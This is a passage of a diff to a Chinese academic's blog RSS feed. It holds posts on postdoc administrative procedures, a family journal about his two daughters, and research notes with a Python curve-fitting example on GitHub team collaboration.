+&lt;li&gt;流动站自主招收出站申请材料清单  2016-11-24&lt;/li&gt;
+&lt;li&gt;流动站自主招收博士后出站申请流程图  2016-10-12&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://hr.nju.edu.cn/6334/list.htm&#34; target=&#34;_blank&#34;&gt;http://hr.nju.edu.cn/6334/list.htm&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/c8b912ac26c1680f0a73b8df7f405355.png&#34; alt=&#34;博士后出站&#34; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Wang, C.J., Wu, L*, Zhang, J., Janssen, M. (2016) The Collective Direction of Attention Diffusion. Scientific Reports. 6: 34059. doi:10.1038/srep34059&lt;/li&gt;
+&lt;li&gt;Wang, C.J., Wu, L.*(2016) The Scaling of Attention Networks. Physica A: Statistical Mechanics and its Applications.448:196–204, doi: 10.1016/j.physa.2015.12.081&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;博士后退站&#34;&gt;博士后退站&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://hr.nju.edu.cn/6342/list.htm&#34; target=&#34;_blank&#34;&gt;http://hr.nju.edu.cn/6342/list.htm&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;办理落户&#34;&gt;办理落户&lt;/h2&gt;
+
+&lt;p&gt;今天青椒村外来务工人员一个狗去公社人力资源部办理了申请集体户口迁移的第一道手续，路过公社保卫处户籍科门口的时候，一只红脖子的鸟站在树上红了眼眶使劲叫，一个狗听了半天没听懂，当然因为它说的是鸟语。&lt;/p&gt;
+
+&lt;p&gt;到鼓楼校区北京西路附近的机械大厦找鲜峰办理博士后集体户口申请，去鼓楼保卫处户籍科办理户籍介绍的证明，然后去鼓楼公安局的办证大厅办理迁入申请，然后回老家迁移户口，最后到大方巷的鼓楼派出所办理入户。&lt;/p&gt;
+
+&lt;h2 id=&#34;今日单词&#34;&gt;今日单词&lt;/h2&gt;
+
+&lt;p&gt;集体户口 collective registered residences.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/b999b0e1ab9238e3d85cd69ebf37913a.png&#34; alt=&#34;博士后办理落户&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/5e047fc89d894689ebf4f06ad5e9a180.png&#34; alt=&#34;户口&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/25fa2aaaf74fa15345273794f8afcd69.png&#34; alt=&#34;身份证&#34; /&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>我的女儿</title>
+      <link>https://chengjun.github.io/en/note/2017-03-21-my-children/</link>
+      <pubDate>Sat, 11 Mar 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://chengjun.github.io/en/note/2017-03-21-my-children/</guid>
+      <description>
+
+&lt;p&gt;&lt;img src=&#34;https://gallery.mailchimp.com/c007b6835f6475cf470f6e0ef/images/a4918492-d8c8-4a18-9e1f-93716e8dc526.gif&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&#34;米果&#34;&gt;米果&lt;/h1&gt;
+
+&lt;p&gt;2017年4月10日，我的第二个孩子二女儿&lt;code&gt;米果&lt;/code&gt;出生了。这个名字是暮白给孩子取得，我和暮白经常记错。暮白对米果说：爱你就像爱生命。米果的大名是&lt;strong&gt;知乐&lt;/strong&gt;。&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:1&#34;&gt;&lt;a rel=&#34;footnote&#34; href=&#34;#fn:1&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;《论语》·雍也篇，子曰：“知（zhì）者乐（yào）水，仁者乐（yào）山；知（zhì）者动，仁者静；知者乐（lè），仁者寿。”&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code&gt;译义有多种。孔子说：“智慧的人喜爱水，仁义的人喜爱山；智慧的人懂得变通，仁义的人心境平和。智慧的人快乐，仁义的人长寿。” 另一理解为 “智者乐，水” ——智者之乐，就像流水一样，阅尽世间万物、悠然、淡泊。“仁者乐，山” ——仁者之乐，就像大山一样，岿然矗立、崇高、安宁。
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;iframe src=&#34;http://chengjun.github.io/note/miguo/&#34; scrolling=&#34;no&#34; width=&#34;300&#34; height=&#34;60&#34;&gt;&lt;/iframe&gt;
+
+&lt;p&gt;米果有肠绞痛，休息不好，不太好带。暮白说米果是树懒熊，因为她经常挂在妈妈身上，必须要抱着才能安静。&lt;/p&gt;
+
+&lt;h2 id=&#34;宝华卫生院&#34;&gt;宝华卫生院&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/957e47189f14eba13fdf8b6b77a78dc8.png&#34; alt=&#34;宝华卫生院&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;需要找一个打预防针和体检的地方。4月18日，我打车去了宝华卫生院，在二楼妇产科办理了&lt;code&gt;回执卡&lt;/code&gt;，但是没有去后面的楼预约打预防针，而满月后第一周就要打针了。&lt;/p&gt;
+
+&lt;p&gt;走玉兰路，经过大宅门，过了沪霍线，就到了宝华镇所在，沿着159线路走就可以到达宝华卫生院，也叫宝华医院。赶不上159路，我徒步走到狮子山站公交坐D5路公交回到恒大雅苑。&lt;/p&gt;
+
+&lt;p&gt;5月8日，米果28天，我下午两点多打滴滴去了宝华卫生院，办理了&lt;strong&gt;接种证书&lt;/strong&gt;，4天后，本周五，给知乐打预防针，滴滴打车到宝华卫生院，去公共卫生楼一楼大厅排队，不要手机预约，10点之前到。下载了一个叫“金苗宝”的app &lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:app&#34;&gt;&lt;a rel=&#34;footnote&#34; href=&#34;#fn:app&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;。&lt;/p&gt;
+
+&lt;h2 id=&#34;米果降临&#34;&gt;米果降临&lt;/h2&gt;
+
+&lt;p&gt;2016年8月20日发现米粒妈妈怀孕了，我给肚子里的小朋友取名米奇或米琪，就是那个漂亮的米老鼠Mickey。小米还不到一岁半。得知这个消息，我和晓青都很崩溃：怎么又这么容易？米粒妈妈和我面对一个困境：生还是不生？！他来的太突然了。&lt;/p&gt;
+
+&lt;p&gt;我意识到这个责任只能我和晓青来抗。父母都表示不干涉，没有意见。时代真得变了。或许是因为要担责任，所以没有心绪。晓青一开始坚决不生，多次落泪。我们去市妇幼做了检查，上网搜索了一些细节。人工流产对子宫是不小的伤害，要越早越好，最好在50-55天的范围内。&lt;/p&gt;
+
+&lt;p&gt;想到这个还没有成形的小人的命运，晓青又转念想生下来。因为如果我们想要二胎，那么晚不如早。但是做出这个决定并不容易，因为：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;一、生下ta将是艰苦时代的到来，米粒一个本来就够缠人的了，再来一个将会耗费很多时间。十月怀胎，十月养育。朝夕陪伴，十分辛苦。&lt;/li&gt;
+&lt;li&gt;二、米粒妈妈的工作就毁了，又要耗费大半年时间在孩子身上。&lt;/li&gt;
+&lt;li&gt;三、不确定性，不知道是男孩还是女孩。二胎政策只能生两个。如果想要一个男孩，那么就只有这一次机会了。于是乎变得很纠结。清宫图说女孩；金钱卦是一个夬卦，据说是男孩。抛硬币三局两胜说生。做判断和做决定是两回事.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;米果的做法&#34;&gt;米果的做法&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/c9d73c9c817ba742d08ca68de6ff1516.png&#34; alt=&#34;米果&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;米果是一种以米为主要原料制成的点心。在松阳一般称米果，糕是甜的，而米果是不甜的，在乡下，米果还是用人工锤打出来的，因此称打米果。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;主料：糯米粉 (200G)&lt;/li&gt;
+&lt;li&gt;调料：黄豆粉 (20G), 辣椒粉3G，白砂糖15G。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;步骤
+　　1、先将糯米粉放入洗干净的电饭锅，倒入适量水，用力揉搓糯米粉，直至面饼状，再揉搓成条状。
+　　2、揪成小米团，揉搓成汤圆大小的团子。
+　　3、煮锅中加水，水开后将糯米团子放入锅中煮沸，直至团子浮上水面，即可捞出。
+　　4、在煮团子的时间内，可以准备裹团子的外衣-米果豆粉+白砂糖，放入干净的容器中，糖的比例看个人口味调节。
+　　5、 团子煮好后，捞出，放入准备好的豆粉中，晃动容器，直至团子被外衣全部裹住，即是成品米果。
+　　6、用筷子将米果夹出，放入盘中，就可以享用了。&lt;/p&gt;
+
+&lt;h1 id=&#34;米粒&#34;&gt;米粒&lt;/h1&gt;
+
+&lt;iframe src=&#34;http://chengjun.github.io/note/mili/&#34; scrolling=&#34;no&#34; width=&#34;300&#34; height=&#34;60&#34;&gt;&lt;/iframe&gt;
+
+&lt;p&gt;《梅花》 唐 崔道融&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;数萼初含雪，孤标画本难。&lt;/li&gt;
+&lt;li&gt;香中别有韵，清极不&lt;strong&gt;知寒&lt;/strong&gt;。&lt;/li&gt;
+&lt;li&gt;横笛和愁听，斜枝倚病看。&lt;/li&gt;
+&lt;li&gt;朔风如解意，容易莫摧残。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;《淮阴夜宿二首》 唐 孙逖&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;水国南无畔，扁舟北未期。乡情淮上失，归梦郢中疑。&lt;/li&gt;
+&lt;li&gt;木落&lt;strong&gt;知寒&lt;/strong&gt;近，山长见日迟。客行心绪乱，不及洛阳时。&lt;/li&gt;
+&lt;li&gt;永夕卧烟塘，萧条天一方。秋风淮水落，寒夜楚歌长。&lt;/li&gt;
+&lt;li&gt;宿莽非中土，鲈鱼岂我乡。孤舟行已倦，南越尚茫茫。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;《红线毯》 唐 白居易&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;红线毯，择茧缲丝清水煮，拣丝练线红蓝染。&lt;/li&gt;
+&lt;li&gt;染为红线红于蓝，织作披香殿上毯。披香殿广十丈馀，&lt;/li&gt;
+&lt;li&gt;红线织成可殿铺。彩丝茸茸香拂拂，线软花虚不胜物。&lt;/li&gt;
+&lt;li&gt;美人蹋上歌舞来，罗袜绣鞋随步没。太原毯涩毳缕硬，&lt;/li&gt;
+&lt;li&gt;蜀都褥薄锦花冷，不如此毯温且柔，年年十月来宣州。&lt;/li&gt;
+&lt;li&gt;宣城太守加样织，自谓为臣能竭力。百夫同担进宫中，&lt;/li&gt;
+&lt;li&gt;线厚丝多卷不得。宣城太守知不知，一丈毯，千两丝。&lt;/li&gt;
+&lt;li&gt;地不&lt;strong&gt;知寒&lt;/strong&gt;人要暖，少夺人衣作地衣。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;故事从2015年3月11日早上十一点五分开始讲起，在这一刻我的女儿在东南大学附属中大医院降生了。我给女儿取名叫米粒，大名叫知寒，希望她可以“知寒问暖”。她的到来令我和妻子万分高兴。然而就在一个多月前，我和妻子还在为异地生产的问题焦头烂额。&lt;/p&gt;
+
+&lt;p&gt;2014年我来南京工作，然而短期之内无法解决户口问题。而妻子在湖南生产则面临产后坐月子我无法陪护的问题，不得已我们只能选择在南京生孩子。然而做出这选择并不容易，因为我和妻子对于南京并不熟悉，在这里我们的朋友也不多，也许更为严重的问题是我们对于异地生产所存在的问题缺乏清晰的认识。断断续续地，我咨询了单位和一些医院，然而得到的回复并不乐观。正当我不知所措的时候，我听别人介绍了中大医院的产科门诊。怀着忐忑的心情，我拨通了中大医院产科的电话。顾晓霞护士长耐心地回答了我的各种问题，提醒我办理各种必要的手续，并指导我的妻子进行产前准备。一个月后，孩子出生了，然而我和妻子对于如何照顾孩子却并不擅长；幸亏有值班护士在，她们充满耐心得进行指导、不断鼓励，从各个方面照顾着产妇和孩子。在很多微小的细节当中，我感受到了医护人员对于工作的尽职尽责。&lt;/p&gt;
+
+&lt;p&gt;如今，我的爱人和孩子顺利出院了。围绕着孩子，家里多了很多欢声笑语。很多时候，我为自己这样一个小家庭感到幸运，更深感自己应该感谢中大医院产科的医护人员。正因为有了你们辛勤的付出，很多崭新的小生命所降临的世界变得更加美好。&lt;/p&gt;
+
+&lt;p&gt;[2015-06-14]作为一个爸爸，我挺失败的。因为没有办法将老婆孩子留在自己身边。暮白的产假时间快到了，24日打过第三次疫苗之后，米粒就要开始跟暮白和奶奶去长沙了。这是我对自己的孩子的亏欠。作为爸爸，自己工作不努力，让孩子受到这些折磨，于我是很大的愧疚。但我有时候会忘记这些愧疚。这么多年，我对家庭说不上好，29岁结婚，为了家庭（很大程度上）我回到了南京。却忽略了南京的高房价、雾霾、暮白在长沙的工作。半年之后，孩子出生，我和暮白也是学着做爸爸妈妈。女儿的出生的确让我的学术研究变得更加雪上加霜。但造成这一问题的主要责任在我。我必须要抓紧一切时间来弥补这一缺失，否则孩子就不是没有户口那么简单。电视一度占用了很多时间，我也体会到一个独立的空间的重要性，它不能是卧室，不能是客厅，就是独立的书房，我现在在厨房外的桌子上。&lt;/p&gt;
+
+&lt;h2 id=&#34;米粒百日礼&#34;&gt;米粒百日礼&lt;/h2&gt;
+
+&lt;p&gt;带米粒去拍照，米粒妈妈在美团上团的券。照例是在一个小区里。打车过去，司机欺负我不识路想绕路，被我用百度地图拆穿（是的，移动互联网让很多坏人很头痛）。我们没有带U盘，所以没有办法拷照片，于是我跟对方要求网络传输，最后还是传到了手机里。给米粒选了三套衣服拍。一个人鱼，一个萝莉，一个袜子一样的，结果很失败的是米粒第二套衣服忘了带帅气的小领结，结果拍出来显得很土。然后，米粒不会做，趴也不成，看镜头就瞪着眼很严肃。所以整个拍摄很痛苦。这类拍摄都是热心的妈妈折腾孩子。所以，我们庆幸只拍了72张。&lt;/p&gt;
+
+&lt;p&gt;带米粒体检，可气的是体检时医生说米粒是&lt;code&gt;慢慢性子&lt;/code&gt;，原因是米粒对于医生手上测智力的红色环子不感冒。她瞪着眼瞅自己想看的地方。打疫苗时因为红屁股没有成功，直接打车去了金盛华东家具城。理发、游泳。理掉了头发的米粒又恢复了靓丽的形象。回家后，突然发觉米粒可以趴，但是要垫高，手臂的摆放很重要，并排在胸前。&lt;/p&gt;
+
+&lt;h2 id=&#34;长沙廿日&#34;&gt;长沙廿日&lt;/h2&gt;
+
+&lt;p&gt;转眼之间在长沙过了二十余天。一到长沙就感觉很疲惫，想睡觉。看女儿的日子充满了挑战和乐趣。米粒喜欢出去玩，主要是睁大眼睛看。她对世界很好奇。每天一早起来，米粒妈妈就带着米粒出去，去研究所外面的小花园看老人舞剑。米粒妈妈说“耍剑”。回来吃过了奶，米粒就要睡觉。我妈特别辛苦，负责哄米粒睡觉。有时候不得要领，小坏蛋就苦啊哭啊。到了十一点半，我就去食堂打饭。四个菜两盘子端回来。一般中间十点半的时候，米粒喂过了一次水就饿了，要电话米粒妈妈回来喂奶。中午吃饭后，午睡。米粒也睡。下午米粒妈妈三点去上班。一般四点半之后还要喂奶。五点半我去打饭。我妈会带着米粒出去。有一段时间是站在实验楼旁等米粒妈妈。后来，去小操场看小伙伴们。因为都是一个单位的，所以大家高度信任，非常友好。&lt;/p&gt;
+
+&lt;p&gt;米粒不好哄。小家伙脾气挺大的。当然，吃饱了就好了。但是，往往有吃不饱的时候。她就哭。我妈很喜欢米粒，经常惯着她。常说米粒“跟着大鱼上串”。米粒嗓子粗，她哼哼的时候，我妈就说“米粒，你又再嘿呼谁？”我妈还喜欢说“米粒是个大孩子，米粒可管了。”我妈对米粒是隔代亲。&lt;/p&gt;
+
+&lt;p&gt;米粒有一个可爱的日本风的小帽子。戴着它，没有人说米粒是小男孩了。长沙人说米粒长得极好，很漂亮。但也有说好胖啊，小胖子。米粒妈妈和我妈都不喜欢别人说米粒胖。后来自我解嘲也叫米粒小胖子了。&lt;/p&gt;
+
+&lt;p&gt;米粒五个半月了，我也要回南京了。很怀念抱着米粒在芙蓉树边、樟树下、操场上、房间里。米粒对我刚刚熟悉，现在又得分开了。&lt;/p&gt;
+
+&lt;p&gt;我这段时间的效率也不行，执行力很差。主要是因为兴趣突然被时间序列给带走了。尝试了好几种贝叶斯建模的方法。一开始是给米粒妈妈的数据建模，后来是给美国2012大选建模。关于公众注意力部门的模型算清楚了。媒介注意力、舆论支持率、公众情绪都会影响到公众注意力。使用公众注意力预测公众注意力当然效果不错，比如用query预测tweets。但是poll本身因为具有很强的trend和seasonality所以不需要采用regression预测。而sentiment和news则主要受到query的影响。&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:2&#34;&gt;&lt;a rel=&#34;footnote&#34; href=&#34;#fn:2&#34;&gt;3&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;米粒回南京&#34;&gt;米粒回南京&lt;/h2&gt;
+
+&lt;p&gt;2015年12月19日，米粒从长沙回到了南京。米粒妈妈辞掉了在长沙中科院的工作，下定决心回到南京了。我要能见到亲爱的女儿了。除了高兴，也感觉到肩上的担子更重了。&lt;/p&gt;
+&lt;div class=&#34;footnotes&#34;&gt;
+
+&lt;hr /&gt;
+
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34;&gt;知寒、知乐是我对两个女儿的寄托。希望她们能够晓得民间疾苦，可以享受知识带来的乐趣。我想的是论语里的意思：智者乐，“忍者瘦”😀。暮白想的是“知道享乐”。社区探访的阿姨听了小孩的名字说“真简单”。
+ &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:1&#34;&gt;&lt;sup&gt;^&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li id=&#34;fn:app&#34;&gt;为什么现在app都比网站好用啊？我猜是因为背后
+ &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:app&#34;&gt;&lt;sup&gt;^&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li id=&#34;fn:2&#34;&gt;我觉得自己很长时间都没有进入写作的流程，而是将精力浪费在了很多类似这种数据探索上面。
+ &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:2&#34;&gt;&lt;sup&gt;^&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/div&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>团队合作中的任务分配</title>
+      <link>https://chengjun.github.io/en/note/2017-02-17-data-insight/</link>
+      <pubDate>Fri, 17 Feb 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://chengjun.github.io/en/note/2017-02-17-data-insight/</guid>
+      <description>
+
+&lt;p&gt;最近一年多一直和令飞折腾&lt;code&gt;团队合作&lt;/code&gt;的东西，也在思考如何进行团队合作。之前是把开会当成头脑风暴，后来发现太浪费时间，尤其是团队成员超过三个人之后（也要兼顾别人没有那么多时间），合作的成本开始上升，如何高效地进行合作就成了一个重要的问题。我们研究的主题也就是这个东西。&lt;/p&gt;
+
+&lt;h1 id=&#34;直接表达claim&#34;&gt;直接表达claim&lt;/h1&gt;
+
+&lt;p&gt;直接地表达claim，然后使用数据证明自己的观点，就会发现其中的断裂的逻辑链条，进而不断完善。&lt;strong&gt;Polish your claim&lt;/strong&gt; 比如，我去统计了用户在不同的repos里的push的次数计算其multi-tasking的香农熵和core team ratio，发现：
+&amp;gt; Github用户倾向于比较平均但深入地参与到团队项目（&lt;code&gt;claim&lt;/code&gt;）。&lt;/p&gt;
+
+&lt;h2 id=&#34;为什么水分可以增加影响&#34;&gt;为什么水分可以增加影响？&lt;/h2&gt;
+
+&lt;p&gt;找一个novelty的点，需要一个narrow down的concrete的research question。要避免一开始要有一个想法，somehow connect to something, 挖来挖去做出来很多unconnected的findings。apparent team不是真实的team， 我们想要找到real team， 因此可以去分析workload distribution and skill set overlapped，及其对于impact的影响。我们想要找一个metric to correct team size. team的&lt;strong&gt;充水&lt;/strong&gt;程度。story！为什么充了水的team的impact更大？what is a real team is research topic。怎么定义水分就靠近hypothesis。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/64335d80b0fc78f1bdaef76612e11750.png&#34; alt=&#34;water team&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;我之前说的一大堆只是想说一个论点：因为我们不是duncan watts，所以我们还是要用正轨的research道路。define topics, narrow it down, implement, provide prospects四部曲的方式。令飞之前说的“什么样是真正有效的合作，从技能的重合度和贡献量来衡量”是research topic, 不是一篇文章的research question。从workload的分布定义一个metric，core team size or effective team size&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;加一个时间维度， 新陈代谢， m(t)&lt;/li&gt;
+&lt;li&gt;diversity，做过多少个不同的项目，experience好测量&lt;/li&gt;
+&lt;li&gt;repeated collaboration&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;组织为什么会失败。junior和senior scholar合作效果不错。&lt;/p&gt;
+
+&lt;h3 id=&#34;task-assignment&#34;&gt;Task Assignment&lt;/h3&gt;
+
+&lt;p&gt;勾勒一个图景，早期/核心用户对任务的分配是如何切割了任务空间的。我们其实是观察不到用户之间的交流，所以只能通过用户各自的工作来推测他们协商任务分配的结果。一种分析角度是，大的任务会由核心用户在早起就“认领”吗？还是大任务（大修改）随时间分配是均匀的。&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://www.robertasinatra.com/&#34; target=&#34;_blank&#34;&gt;Roberta Sinatra&lt;/a&gt;等人2016年发表Quantifying the evolution of individual scientific impact &lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:Sinatra&#34;&gt;&lt;a rel=&#34;footnote&#34; href=&#34;#fn:Sinatra&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;， 把一个科学家当一个sample,发现impact的分布无法简单用sample size N（发文章数量）rescale到一起。于是给每个sample一个参数Qi，这样就能把所有科学家的所有论文的影响力分布collapse 到一起，解释了为什么高量产的科学家，论文影响力极大值比根据样本规模随机从系统取还要大的问题-其实没有解释，就是管这个叫Q 了。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;ttp://sciencepaths.kimalbrecht.com/&#34; target=&#34;_blank&#34;&gt;Science paths&lt;/a&gt; 网页可视化&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=qlnxM-ld4BU&#34; target=&#34;_blank&#34;&gt;Is a scientific career predictable?&lt;/a&gt; nature视频&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;科学探索和合作写代码还不一样，前者有可能真的不知道最重要的工作什么时候出现，后者的任务空间是个有限集合，任务的重要性和完成度是排他性的&lt;/p&gt;
+
+&lt;p&gt;Team Assembly Mechanisms Determine Collaboration Network Structure and Team Performance&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:Guimer&#34;&gt;&lt;a rel=&#34;footnote&#34; href=&#34;#fn:Guimer&#34;&gt;2&lt;/a&gt;&lt;/sup&gt; 一文题目应该叫“学术圈”。三个结论1. ）科学家是有圈子的，类似于渗流模型的giant cluster 好几个学科都是这样，越是好刊物的合作者数据，越能看到这个圈子存在2. ）模型参数m 团队规模, p 选择已经发表过文章老鸟合作的概率，q 选择已经合作过的人再次合作的概率，发现要想发高影响力的文章，p要大，q要小，也就是不要轻易和菜鸟合作，但也不要总是和同一批人合作；3）该模型可以复现团队规模的相变-稳定增长到收敛在一个优化值，和学科内部合作网络出现精英圈子的消息。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;哈佛商业评论 Using the Crowd as an Innovation Partner&lt;/li&gt;
+&lt;li&gt;Management Science上的Incentives and Problem Uncertainty in Innovation Contests: An Empirical Analysis&lt;/li&gt;
+&lt;li&gt;Uzzi B, Mukherjee S, Stringer M, Jones B. 2013. Atypical combinations and scientific impact. Science 342:468–72&lt;/li&gt;
+&lt;li&gt;Lee Y N, Walsh J P, Wang J. Creativity in scientific teams: Unpacking novelty and impact. Research Policy, 2015, 44(3):684-697.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;拟合代码量的累积增长&#34;&gt;拟合代码量的累积增长&lt;/h2&gt;
+
+&lt;p&gt;可以先把10个人的team的代码总量随（绝对）时间的变化看一下C是t时刻的代码总量，A是无穷远时代码总量，tau大概就是半衰期。然后画一个所有大team的tau的分布，如果是双峰的分布，说明确实有两种team。20120311之后出现的team好像都有显示代码量。&lt;/p&gt;
+
+&lt;p&gt;$$C(t)=A(1-e^{-t/\tau})$$&lt;/p&gt;
+
+&lt;p&gt;两边求导再离散化,先求导的：$\frac{dC (t)}{dt} =\frac{A}{\tau} e^{-t/\tau}$&lt;/p&gt;
+
+&lt;p&gt;左边的导数可以用两点间的斜率近似， $\frac{dC (t)}{dt} =\frac{(C (t+\delta t)-C (t))}{\delta t} $，离散一下 $\delta t =1$，即：&lt;/p&gt;
+
+&lt;p&gt;$$C(t+1)-C(t) = \frac{A}{\tau} e^{-t/\tau}$$&lt;/p&gt;
+
+&lt;p&gt;两边取对数，$log(C(t+1)-C(t))= log\frac{A}{\tau} - t/\tau$&lt;/p&gt;
+
+&lt;p&gt;令$\beta = -1/\tau$，$y = log(C(t+1)-C(t))$, $constant = log\frac{A}{\tau}$, 则存在:&lt;/p&gt;
+
+&lt;p&gt;$y = constant + \beta t$&lt;/p&gt;
+
+&lt;p&gt;对数据进行处理得到$y$和$t$，采用线性回归进行拟合，即可得到constant和$\beta$。那么显然：$\tau = -1/\beta$, $ A = e^{constant} $, $\tau = - e^{constant}/\beta $&lt;/p&gt;
+
+&lt;p&gt;我尝试去拟合了tau和A, 结果产生了大量的负的tau和A，另外，多数R方都不大，效果不好。这里的$\tau$与这个代码增长速度随时间变化是负的反比关系。因为挺多项目的代码增长速度是非线性的，比如相邻两次的变化量是先递增，后减小，或者一直增加。都会导致线性拟合的效果不好。&lt;/p&gt;
+
+&lt;p&gt;一个例子见以下代码：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import statsmodels.api as sm
+import numpy as np
+import matplotlib.cm as cm
+from datetime import datetime
+
+def interpolating(data):
+    # To interpoloate data
+    bad_indexes = np.isnan(data)
+    good_indexes = np.logical_not(bad_indexes)
+    good_data = data[good_indexes]
+    interpolated = np.interp(bad_indexes.nonzero()[0], good_indexes.nonzero()[0], good_data)
+    data[bad_indexes] = interpolated
+    return data
+
+
+d = [&#39;2014-01&#39;, &#39;2012-09&#39;, &#39;2013-08&#39;, &#39;2013-09&#39;, &#39;2012-10&#39;, &#39;2013-05&#39;, &#39;2013-06&#39;]
+v = [&#39;1192&#39; ,&#39;163&#39;, &#39;605&#39;, &#39;1189&#39;, &#39;167&#39; ,&#39;199&#39;, &#39;199&#39;]
+d = [datetime.strptime(i+&#39;-01&#39;, &amp;quot;%Y-%m-%d&amp;quot;) for i in d]
+d = [(i - np.min(d)).days/30 + 1 for i in d]
+v = [int(i) for i in v]
+dv = zip(d, v)
+dv = sorted(dv,key=lambda x:x[0])
+d, v = np.array(dv).T
+yt = np.array(v[1:]) - np.array(v[:-1])
+t = d[:-1]
+x = t#np.log(t)
+y = np.log(yt+1)
+y = interpolating(y)
+# fit
+xx = sm.add_constant(x, prepend=True)
+res = sm.OLS(y,xx).fit()
+constant, beta = res.params
+r2 = res.rsquared
+tau = - 1.0/beta
+A = tau*np.exp(constant)
+print &#39;Tau = &#39;,tau,&#39;A=&#39;,  A, &#39;constant = &#39;,constant, &#39;beta =&#39;, beta,&#39;rsquare = &#39;, r2
+
+fig = plt.figure(figsize=(10, 5))
+ax = plt.subplot(1,2,1)  
+plt.plot(d, v, &#39;r-s&#39;)
+plt.xlabel(r&#39;month&#39;);plt.ylabel(r&#39;size&#39;)
+ax = plt.subplot(1,2,2)  
+plt.plot(x, y, &#39;rs&#39;)
+plt.plot(xx, constant+xx*beta,&amp;quot;red&amp;quot;)
+plt.xlabel(r&#39;t&#39;);plt.ylabel(r&#39;log(c(t+1)-c(t))&#39;)
+plt.show()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/19d58b4deb8a292c287dc692898a89af.png&#34; alt=&#34;tau&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;To-do:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;最大的push次数的人和最多push代码量的人是否一个人，计算一个rate&lt;/li&gt;
+&lt;li&gt;算sleeping beauty index&lt;/li&gt;
+&lt;li&gt;如果把每个人的工作量换算成绝对代码增减量, 还是可以仿照m的定义计算熵。熵小的大石头放好了，大部分人都是添沙子。大石头什么时候放进去的也很有信息量。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;尽快确定一下最大代码贡献者和最频繁贡献者的重合率，感觉这个还是比较影响整个故事走向的。另外，试一下最大代码出现时间的分布。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/bd3743ee8842b10dcd0e33142af77b5e.png&#34; alt=&#34;overlap rate&#34; /&gt;&lt;/p&gt;
+
